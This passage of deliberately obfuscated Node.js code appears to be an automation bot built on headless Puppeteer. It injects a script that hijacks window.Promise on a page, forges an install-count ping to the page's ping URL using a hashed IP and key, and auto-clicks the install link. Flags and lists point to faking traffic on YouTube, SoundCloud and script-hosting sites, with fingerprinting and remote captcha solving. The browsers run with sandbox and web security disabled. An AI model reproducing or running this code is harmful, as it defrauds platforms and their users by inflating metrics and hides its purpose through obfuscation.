                return this['bytes'] > -0xc4e0 * 0x1737 + 0x1b593 * 0x8831 + -0x43d2b4 * -0x9b && (this['hBytes'] += this['bytes'] / (0x6e13f1cc * 0x1 + -0x63b4cb38 + 0xf5a0d96c) << 0x1727 * -0x1 + -0xe5 * -0x1f + -0x494, this['bytes'] = this['bytes'] % (0x34f6dca * 0x4a + -0x4 * 0x5d627f80 + 0x18094419c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1 * 0xda3 + 0x1b30 + 0x82a * -0x5;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x2ac * 0x4 + -0xfb9 + -0x1 * -0x519] = this['block'], J[K >> -0x190 * 0x6 + 0x292 * -0x1 + 0xbf4] |= x[0x84c + 0x9a8 * 0x3 + -0x2541 & K], this['block'] = J[0x1ad0 + -0x2bf * 0x3 + 0x1283 * -0x1], K >= 0xf31 * -0x1 + 0x22 * -0x77 + 0x1f37 && (this['hashed'] || this['hash'](), J[0x1 * -0xc9d + -0x1 * 0x163a + 0x22d7] = this['block'], J[0xeb5 + 0x4 * -0x43 + -0xd99] = J[-0x15 * 0x10f + -0x18e4 + 0x2f20] = J[0xf * -0x215 + 0x20f0 + -0xf * 0x1d] = J[-0x77 * 0x3b + -0x367 + -0x1 * -0x1ed7] = J[-0x1 * 0x241c + 0x5f8 + 0x1e28] = J[0x1618 + 0x497 * -0x4 + -0x3 * 0x13d] = J[-0xd6f + 0x2275 + -0x1500] = J[0x15b0 * -0x1 + 0xc1c * -0x1 + 0x4d5 * 0x7] = J[-0x2192 + 0x156a + 0x4e * 0x28] = J[0x3dc + -0x1095 + 0xcc2 * 0x1] = J[-0x748 + -0x2 * 0xa97 + -0x4 * -0x720] = J[0x25 * -0x72 + 0x2452 * 0x1 + 0x25 * -0x89] = J[-0x5 * -0x3cb + -0x14be + -0x1d3 * -0x1] = J[0x2161 + -0x1109 * 0x1 + -0x104b] = J[-0x2fa * -0x5 + 0x45e + -0x1332] = J[0x21b0 + 0x1 * 0x1a11 + -0x3bb2] = -0x1b1d + 0x1 * 0x168d + 0x1 * 0x490), J[-0x6d * 0x3f + -0x1c00 + -0x29d * -0x15] = this['hBytes'] << 0x21b4 + 0x1b6e + -0x3d1f | this['bytes'] >>> -0xfa * -0x3 + -0xfc0 + 0x4d * 0x2b, J[0x293 + -0x15f7 * -0x1 + -0x187b] = this['bytes'] << -0x18f3 + 0x1baa + -0x2b4, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xb75 * -0x3 + 0x137d + -0x1 * -0xef2; J < 0x1399 + 0x1b37 * 0x1 + -0x2e80; ++J)
                K = Q[J - (-0x47f * 0x5 + 0x2 * 0xa45 + -0x2 * -0xfa)] ^ Q[J - (-0x1 * -0x2037 + -0x1 * -0x1855 + -0xe21 * 0x4)] ^ Q[J - (0x3cb * -0x4 + 0x2364 + -0x142a)] ^ Q[J - (-0x1 * 0xd6 + 0x83 * 0x35 + -0x89 * 0x31)], Q[J] = K << 0x2 * -0x3a9 + -0xe + 0x761 | K >>> -0x4 * -0x624 + 0x1c49 + -0x18d * 0x22;
              for (J = 0xd46 + -0x8 * 0x31a + 0xd3 * 0xe; J < -0x1855 + -0x1 * -0x23f3 + -0xb8a; J += 0x101 * 0x1b + -0xd8b * -0x1 + -0x28a1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x21fe + -0x1df0 + 0x9 * 0x71b | L >>> -0x2562 + 0x11e4 + 0x1 * 0x1399) + (M & N | ~M & O) + P + (-0x2 * -0x6027c6f + 0x8 * 0x153b9947 + -0x5b5f497d) + Q[J] << -0x11 * 0x22d + 0x26b3 + -0x1b6) << -0x2 * -0x11fd + -0x2 * -0x893 + -0x351b | P >>> -0x8eb + 0x17bd + -0xeb7) + (L & (M = M << 0xaa0 + 0x15 * -0x31 + -0x1 * 0x67d | M >>> 0x25c3 * 0x1 + 0x5a7 + -0x2b68) | ~L & N) + O + (-0x458a7d3 + 0x1af * 0x5b961 + 0x13aa9 * 0x4555) + Q[J + (0x7ef + 0x758 * -0x1 + -0x96)] << 0x1887 + -0x1 * -0x1a0b + -0x3292) << -0x5 * -0x475 + 0xcf * 0x12 + -0x24d2 | O >>> 0x743 + 0xbf0 * 0x3 + -0xdc * 0x32) + (P & (L = L << 0x20fd + 0xd52 + -0x2e31 | L >>> 0x1073 + 0x140b + -0x247c) | ~P & M) + N + (0x6a522637 * 0x1 + -0x1a52e309 * 0x3 + 0x5 * 0xca1cc19) + Q[J + (0x40a + 0x18cf + -0x17 * 0x141)] << 0x196 * -0x12 + 0x1 * 0x19cf + 0x2bd) << 0x1 * 0x10af + -0x2079 + 0xfcf | N >>> 0x2 * -0xa9a + -0x6aa * 0x2 + 0x22a3) + (O & (P = P << 0x180 + -0xda2 + 0xc40 | P >>> 0x1 * -0x1b75 + 0x18b9 * -0x1 + 0x3430) | ~O & L) + M + (-0xb476c213 + -0xb0aa1f77 + 0x1bfa35b23) + Q[J + (0x18fc + 0x38 * -0x3c + 0x9 * -0x151)] << -0x872 + -0x9 * -0x36d + -0x1663) << 0x18d2 + -0x1094 * 0x2 + 0x85b | M >>> -0x3eb * 0x8 + 0xcf0 + 0x1283) + (N & (O = O << -0x883 + 0x7af + 0xf2 | O >>> -0x88 * 0x2e + -0x72b * -0x3 + -0xfb * -0x3) | ~N & P) + L + (-0x2f096927 * -0x2 + -0x1108e63 * -0x1f + -0x2653 * 0xf446) + Q[J + (0x191 * 0xc + -0x157b + 0x2b3)] << 0x12e8 + -0x11 * -0x75 + -0x1aad, N = N << 0x21ed + 0xed7 + 0x2 * -0x1853 | N >>> 0x1a0 + 0x12ff + -0x6df * 0x3;
              for (; J < 0x14 * 0x13d + 0x14a + -0xc3 * 0x22; J += 0x15f4 + 0x1477 + 0x51 * -0x86)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x2 * 0x35e + -0x254f + 0x1e98 | L >>> 0x2b3 * -0x8 + -0x1761 + 0x2d14 * 0x1) + (M ^ N ^ O) + P + (-0x3d5a4713 + -0x265fd49d + 0xd2940751) + Q[J] << -0x6 * 0x628 + -0x1bdc + 0x40cc) << 0x1fc1 + 0x1 * 0x16fd + 0x36b9 * -0x1 | P >>> 0xa6c + 0x11ba + -0x1c0b) + (L ^ (M = M << -0x1 * -0x11d2 + 0x2473 + -0x3627 | M >>> -0x16f * 0x1 + 0x4 * -0x67f + 0x7 * 0x3eb) ^ N) + O + (0x29265d3 * 0x49 + -0x66f9c60e + 0x1a14a884) + Q[J + (0xe48 * -0x1 + -0x147a + 0x22c3)] << -0x2535 + 0x2da + 0x225b) << -0x638 + -0x3d * 0x67 + 0x1ec8 | O >>> 0x91d * 0x2 + -0x71 * 0x4 + -0x105b) + (P ^ (L = L << 0xdb1 + -0x4de + -0x8b5 | L >>> -0x3 * 0xb15 + -0x2506 + 0x4647) ^ M) + N + (-0x3f39c06a + -0x17983 * -0x683f + 0x14598cce) + Q[J + (0x2557 + 0x2 * 0x351 + -0x2bf7 * 0x1)] << 0x23aa + -0x4fb + -0x1eaf) << 0xb70 + -0x10c9 * 0x2 + 0x1 * 0x1627 | N >>> -0x1e01 * 0x1 + 0x9 * 0x427 + -0x743) + (O ^ (P = P << -0x10ff + 0xd9 + 0x1044 | P >>> 0x367 + -0x1bb8 + 0x1df * 0xd) ^ L) + M + (-0xbc44fb0d + 0x248fd8 * 0x574 + 0x7 * 0xe3fc942) + Q[J + (0x702 + -0xf3 * -0x25 + -0x2 * 0x150f)] << 0x4 * -0x949 + 0x1f * 0x31 + 0x1f35) << -0x2 * -0x3f2 + -0x9a9 * -0x2 + -0x1b31 | M >>> 0x1 + 0x1608 + -0x15ee) + (N ^ (O = O << 0x116 * -0x2 + 0x7d4 + -0x58a | O >>> -0x1f71 + 0x1e9a + 0xd9) ^ P) + L + (0xd6d6c9eb + 0xbba59 * 0xcf7 + 0x51cc5 * -0x3215) + Q[J + (0x1 * -0x23f2 + 0x76d * -0x1 + 0x2b63)] << -0x200f + 0x11ab + 0xe64, N = N << -0x1 * -0x257f + -0x43 * 0x1e + -0x1d87 * 0x1 | N >>> -0x19e + 0x2555 + -0x23b5;
              for (; J < -0x98b + 0xf57 * 0x1 + -0x1 * 0x590; J += -0x255e + -0xfe7 + -0x354a * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x174b + -0x1fce + 0x888 | L >>> 0x144 + 0x13 * 0x13d + -0x18b0) + (M & N | M & O | N & O) + P - (-0x1 * -0x3905bf2d + -0x28486cb3 + 0x6026f0aa) + Q[J] << 0x1 * 0x24e6 + -0x2 * 0xba2 + -0xda2) << -0x149e + 0x19 * 0x7f + 0x83c | P >>> -0x80 * 0xa + -0x525 * -0x1 + -0xa) + (L & (M = M << -0x138 * -0x1f + -0x27a * -0xb + -0x40e8 | M >>> -0x5ad + -0x18b9 + 0x1e68) | L & N | M & N) + O - (0x1a18f6b * 0x6b + -0x92d0647a + 0xfd7 * 0x560a3) + Q[J + (0xd16 + 0x54e + -0x1263 * 0x1)] << 0x15fb + 0x1 * -0x113d + -0x4be) << 0x23b2 * -0x1 + 0x4b + -0x11b6 * -0x2 | O >>> 0x2 * 0xc43 + 0xfc0 + -0x282b) + (P & (L = L << 0xd41 + -0xec1 + 0x19e | L >>> -0x9e6 + -0x1892 + 0x227a) | P & M | L & M) + N - (0x3093b9ef + -0x4f * -0x10c7d91 + 0x6 * -0x3170917) + Q[J + (-0x1e49 * 0x1 + 0x1 * 0x1993 + 0x4b8)] << -0x1b01 + 0xe3 * 0x24 + -0x4eb) << -0x21bb + 0x1 * -0x21ce + 0x21c7 * 0x2 | N >>> 0x1 * 0x1460 + 0x10a * 0x1f + 0x5 * -0xa7f) + (O & (P = P << 0xf3d + -0xacc * -0x1 + -0x19eb | P >>> -0x14cf + -0x5bc + -0x3cb * -0x7) | O & L | P & L) + M - (-0x48d8f0dd * -0x1 + -0x12 * 0x87e127a + 0xc0e89edb) + Q[J + (0x1a0e + 0x5a * 0x29 + -0x2875)] << 0x23 * 0x8c + 0x1055 * -0x2 + -0x1 * -0xd86) << 0x1 * 0x16cf + -0x24e + -0x147c | M >>> 0x244d + 0x559 * -0x1 + -0x1ed9) + (N & (O = O << 0xf9b + 0x3 * 0x152 + -0x17f * 0xd | O >>> -0x17 * 0x11b + 0x1 * -0x1f57 + -0x22f * -0x1a) | N & P | O & P) + L - (-0x422149d * 0x35 + 0xe80b6a8 + 0x13d71d0fd) + Q[J + (0x134f * -0x2 + -0x933 + 0x2fd5 * 0x1)] << -0xe53 + -0x1e96 + 0x1 * 0x2ce9, N = N << -0x23a * 0x4 + -0x184d + 0x2153 | N >>> 0x23c2 + 0x7b5 * -0x2 + -0x1456 * 0x1;
              for (; J < -0x2e7 + 0x16a * -0x2 + 0x77 * 0xd; J += -0x69d + -0xb * -0x269 + -0x7 * 0x2d7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x256e + 0xafc + 0x1a77 | L >>> -0xde3 + -0x401 * -0x6 + -0xa08) + (M ^ N ^ O) + P - (0x1 * -0xc4b05f + 0x3 * 0x186b41df + 0x4b7f5c5 * -0x4) + Q[J] << -0x1753 * 0x1 + 0x189f + -0x14c) << -0x7 * -0x4e9 + -0x1012 + -0x208 * 0x9 | P >>> -0x831 * 0x1 + 0x50 * 0x2d + -0x6 * 0xf6) + (L ^ (M = M << -0x3 * 0xab6 + -0x20 * -0x83 + 0x20 * 0x7f | M >>> 0x20b7 + -0xd2f + -0x1386) ^ N) + O - (0x4da32280 + -0xf3b51 * -0x125 + -0x2a4831 * 0xfb) + Q[J + (-0x3 * 0xadc + -0xb9 * -0x21 + 0x8bc)] << 0x20e2 + -0x351 * 0x2 + 0xd20 * -0x2) << -0x1a11 * 0x1 + -0x3 * -0x407 + 0xe01 | O >>> -0x1205 + -0xea5 + -0x1 * -0x20c5) + (P ^ (L = L << 0x1e53 + 0xc27 + -0x2a5c | L >>> -0x246a + 0x92 * -0x2e + 0x3ea8) ^ M) + N - (0x550338d2 + -0x3c3b2098 + 0x1cd525f0) + Q[J + (0xfad + -0x3cf * 0x1 + -0xbdc)] << -0x3dd + 0x54b * 0x2 + 0x6b9 * -0x1) << -0x23eb + -0x12a0 + 0x6d2 * 0x8 | N >>> 0x158b + 0x3 * -0x419 + 0x925 * -0x1) + (O ^ (P = P << -0x40 * -0x94 + -0x28 * -0x43 + -0x2f5a | P >>> -0x10c0 + 0x11b7 + -0x23 * 0x7) ^ L) + M - (-0x177cb4e6 + 0x4cd1689 + 0x484cdc87) + Q[J + (-0xe * -0x13d + -0x9b + -0x2 * 0x85c)] << 0x2e * -0xa9 + 0x1ab6 + -0x75 * -0x8) << -0x83 * -0x39 + 0x5c * 0x59 + 0xa * -0x61d | M >>> -0x1ceb + 0x1e * -0x3c + 0x41 * 0x8e) + (N ^ (O = O << 0x152 * -0x5 + -0x14cf + 0x1b87 | O >>> -0x1270 + -0xe2e + 0x20a0) ^ P) + L - (-0x19ca5a8c + 0x4d67bf8c + 0x97d * 0x35f2) + Q[J + (0x295 * -0x3 + -0x24b * -0x4 + 0x13 * -0x13)] << -0x9 * 0xc9 + 0x14ce + -0x1 * 0xdbd, N = N << -0x2040 + 0x20e3 + -0x85 | N >>> 0x1 * -0x1d7b + 0x2b6 + 0x1ac7;
              this['h0'] = this['h0'] + L << 0xd65 + 0x1 * -0x20cc + 0x1367 * 0x1, this['h1'] = this['h1'] + M << -0x1a4b + 0x73c * 0x3 + 0x497, this['h2'] = this['h2'] + N << -0x98b * -0x1 + -0x1 * -0xf58 + -0x18e3, this['h3'] = this['h3'] + O << 0x2356 + 0x563 + 0x1a1 * -0x19, this['h4'] = this['h4'] + P << 0xda * 0x1f + 0x47 * -0x16 + -0x144c;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x2 * 0x109b + 0x9e * 0x21 + -0x4 * -0x33d & -0x6d + -0x1e99 + 0x1 * 0x1f15] + w[J >> -0x1 * 0x8f5 + 0x1e24 + 0x1517 * -0x1 & -0x1 * 0x1cc7 + -0x54f * -0x3 + 0x1 * 0xce9] + w[J >> -0x1b22 + -0x1183 + 0x2cb9 * 0x1 & -0x1 * 0x1696 + 0x44 * -0xb + 0x1991] + w[J >> -0x3 * -0x3fb + 0x13c6 + 0x1 * -0x1fa7 & 0x211 * -0x2 + -0xc7 * 0x31 + 0x8 * 0x549] + w[J >> -0x1d26 + 0x1ca + -0x1 * -0x1b68 & -0x803 * 0x4 + -0x1779 + 0x3794] + w[J >> 0x1 * 0x1c3d + -0x1c2c + -0x9 & -0x1af * -0x1 + 0x197b + -0x1b1b] + w[J >> 0x61b + -0x1d8c + 0x1775 & 0x22c0 + 0x1619 * -0x1 + 0x34 * -0x3e] + w[-0x1f98 + -0x1645 + 0x35ec & J] + w[K >> -0xf * 0x1fb + -0x83d + 0x260e & 0x31 * -0x86 + -0x9a5 + -0x19 * -0x16a] + w[K >> -0x9af + 0x11e + 0x8a9 & 0x43 * 0x5c + -0x1016 + -0x7ef] + w[K >> -0x59a + -0x2f * -0x61 + -0x9 * 0x159 & 0x6 * 0x525 + 0x511 * 0x1 + -0x23e0] + w[K >> -0x826 * 0x4 + 0x10df + 0x9 * 0x1c1 & 0x5b * -0x19 + -0x150b * -0x1 + -0xc19] + w[K >> -0x8 * -0x4dd + -0xecb + -0x1811 & -0x2 * -0x30b + 0x136 + 0x6d * -0x11] + w[K >> -0x2491 + -0x2f2 * -0x8 + 0xd09 & -0x105b * -0x1 + 0x15 * -0x9 + 0xf8f * -0x1] + w[K >> 0x3 * -0x757 + -0x2 * -0xd85 + -0x501 & 0x182d + 0x41b * 0x8 + -0x17 * 0x27a] + w[-0x3a6 * 0x5 + 0x1039 * -0x1 + 0x2286 & K] + w[L >> 0x2516 + 0x3 * -0x123 + 0xd * -0x295 & 0xd69 * -0x1 + 0x4cc + 0x8ac] + w[L >> 0x25d6 + -0x1 * 0x1946 + -0x7 * 0x1c8 & -0x63a * -0x6 + -0x1bf7 * -0x1 + -0x4144] + w[L >> -0x10a9 + -0x1d0b + -0x24a * -0x14 & -0x135 * -0x9 + -0x25eb + 0x1b1d] + w[L >> 0x26b4 * 0x1 + 0x6a1 + -0x3 * 0xf17 & 0xfbe + -0x1df + -0xdd * 0x10] + w[L >> 0x3e3 * 0x1 + -0xf5c * -0x1 + -0x3d7 * 0x5 & -0x1 * -0x35b + 0x152b + -0x1877 * 0x1] + w[L >> 0x3 * 0x3f1 + 0x377 + -0xf42 & -0xf23 * 0x1 + -0x1d * -0x2 + -0x2 * -0x77c] + w[L >> -0x1c21 + 0x1 * 0x1583 + 0x6a2 & -0x52 * -0x1 + 0x3 * -0x772 + 0x1613] + w[-0x12de + 0x323 * -0x5 + -0xa * -0x376 & L] + w[M >> -0x815 + -0x2231 + 0x2a62 & -0xd * 0x102 + -0xcc8 * -0x2 + -0xc67] + w[M >> 0x1eee + 0x1e2f + 0x3d05 * -0x1 & 0x1 * 0x463 + -0x2 * 0x12fb + -0x59b * -0x6] + w[M >> 0x1675 + -0x191e + 0x2bd * 0x1 & 0x1d1 * -0xc + -0x1b * -0x13d + 0x26 * -0x4e] + w[M >> -0x629 + 0x203b + 0x1a02 * -0x1 & 0x26 * -0x27 + 0x1046 + -0x1 * 0xa6d] + w[M >> -0x18b8 + 0x1 * 0x1343 + 0x581 & 0x421 * -0x2 + 0xb20 + -0x1 * 0x2cf] + w[M >> 0x1364 + -0xf21 + -0x43b & -0x23f4 + -0xd98 + 0x319b] + w[M >> 0xe46 + -0xa * -0x21c + 0xa * -0x389 & 0x4 * 0x78d + 0x2512 + 0x1 * -0x4337] + w[0x3 * 0xae1 + -0x1a * -0x11b + -0x14e * 0x2f & M] + w[N >> -0x1951 * 0x1 + 0x1b60 + 0x1f3 * -0x1 & -0x538 * -0x1 + 0x3 * -0x224 + 0x143] + w[N >> 0x1 * -0x1b43 + 0xc5 * -0x4 + 0x1e6f & 0x19e6 + -0xe5d * 0x2 + -0x2e3 * -0x1] + w[N >> 0x153 * 0xf + -0x1 * -0x1c73 + -0x6 * 0x80a & -0x1 * -0x1fea + -0x211d * 0x1 + 0x142] + w[N >> -0x4 * 0x2fb + 0xc2a * 0x2 + 0x8 * -0x18b & -0x15e + -0x216 + 0x383] + w[N >> 0x168b * 0x1 + 0x1 * 0xc22 + -0x24f * 0xf & 0x21dc + 0x11 * 0x21d + 0xf * -0x4a6] + w[N >> -0xf77 + -0x2b + -0x2 * -0x7d5 & 0x8b9 + -0x71 * -0x26 + 0x1970 * -0x1] + w[N >> -0x1c09 + 0xb65 + 0x29 * 0x68 & 0x2d0 + 0x1 * -0x1127 + 0xe66] + w[-0x7 * 0xee + -0x1981 + 0x2012 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x33 * -0x97 + 0xd9d * 0x1 + -0x2b9a & 0x2 * -0x305 + -0x39 * 0x39 + -0x9dd * -0x2,
                J >> 0x13c6 + -0x40a * 0x9 + 0xf * 0x11c & -0x8 * -0x2 + -0xab7 + -0x1aa * -0x7,
                J >> -0xc4 * -0x3 + 0x1e * 0x10f + 0xa * -0x367 & -0xeb9 * -0x2 + 0x12 * 0x83 + -0x25a9,
                0x1 * 0xc14 + 0x1281 * -0x1 + 0x76c & J,
                K >> -0x771 + 0x1dfd + -0x1674 & -0x4 * 0x99e + -0x20f * 0x7 + 0x35e0,
                K >> 0x1 * -0x22a7 + -0x7 * 0x57a + 0x490d & -0xaef + 0x1b31 * 0x1 + 0x1 * -0xf43,
                K >> -0x15b * -0x7 + -0x154 * -0x16 + -0x26ad & 0x13 * -0x145 + -0x8 * -0x182 + -0x3 * -0x45a,
                0x1c3 + 0x19c2 + -0x1a86 & K,
                L >> 0xb76 + 0x6 * 0x634 + -0x184b * 0x2 & 0x1fb9 * -0x1 + 0x154e + 0x1 * 0xb6a,
                L >> 0x2141 + -0x21 * -0x3e + 0x32b * -0xd & 0x548 * 0x4 + 0xa7b + 0x2 * -0xf4e,
                L >> -0x10ac + -0xa2 * 0x3a + 0x3568 & 0x17 * -0x115 + -0x4 * -0x34b + 0xcb6,
                -0x1ea6 + 0x1059 + 0xf4c & L,
                M >> -0x1 * 0x1410 + 0x742 + 0xce6 & 0x1 * -0x1a3 + 0x7 * -0x4bb + 0x23bf,
                M >> 0x2470 + 0x1c5d + 0x1 * -0x40bd & 0x115f + -0xcf2 * -0x2 + -0x2a44,
                M >> 0x1bbc + 0x10d * 0xb + -0x2743 & -0x24c9 + -0x1189 + 0x3751,
                -0x7 * 0x509 + 0x1 * -0x1895 + 0x3cd3 & M,
                N >> -0x1 * 0x1097 + -0x10a2 * 0x2 + 0x31f3 * 0x1 & 0xd3a + 0x2c7 + -0xf02,
                N >> 0x1b87 + -0x19ac + -0x11 * 0x1b & -0xaa0 + 0x2 * 0xe4f + -0x10ff,
                N >> -0x1 * 0x2177 + -0x9ef + -0x6d * -0x66 & -0x1279 * -0x1 + -0x196d + 0x7f3,
                -0x3 * -0xfe + -0x2 * 0x3ad + 0x55f * 0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x229a + -0x884 + 0xd01 * -0x2), (K = new DataView(J))['setUint32'](0xb * 0x347 + -0xcc0 + -0x174d, this['h0']), K['setUint32'](-0x471 * 0x7 + -0x2ad * 0x4 + 0x29cf, this['h1']), K['setUint32'](-0x1 * 0x882 + -0x1552 * 0x1 + 0x1ddc, this['h2']), K['setUint32'](0x52e * -0x3 + 0x1195 + -0x49 * 0x7, this['h3']), K['setUint32'](-0x1f3a + -0x1538 + 0x40a * 0xd, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x25ee + 0x2151 + -0x473f];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x5 * 0x17c + 0x23cd + -0x2b39;
            J[0x8f * 0x1 + 0x216d + -0x21fc]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x11ac + -0xd64 + 0x1 * -0x448] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x7f * -0x1d + 0x18c2 + -0x52f * 0x2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x12e0 * -0x2 + 0x169c + -0x3c5b * 0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x10be + -0x4 * 0x502 + 0x6 * 0x71b), Promise['resolve'](0x17db * -0x1 + 0x327 * 0x1 + -0x9 * -0x24d);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x1aee + 0x62 * -0x15 + -0x12e4; j < 0x2016 + 0x16e4 + -0x36f9; j++)
    i();
}
const NETWORK_PATIENCE = 0xc82 + 0x143e + -0xc * 0x20 + (0xc0 * -0x17 + -0xbf * 0x2f + -0x61 * -0xa9) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1e37 + 0x193 * -0x16 + -0x1037 * -0x4) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + V(0x11) + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1f27 * -0x1 + -0x1 * -0x8e1 + 0x1646; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + W(0x12) + 